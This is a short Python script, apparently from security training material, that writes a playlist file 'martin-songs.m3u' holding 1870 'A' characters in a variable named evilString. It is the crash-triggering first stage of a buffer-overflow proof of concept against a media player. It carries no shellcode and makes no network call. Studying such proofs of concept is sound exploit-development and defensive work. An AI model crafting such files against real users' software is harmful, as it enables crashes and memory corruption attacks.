# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443


filename = "martin-songs.m3u"

evilString =  "A"*1870 


file = open(filename,'w')
file.write(evilString)
file.close()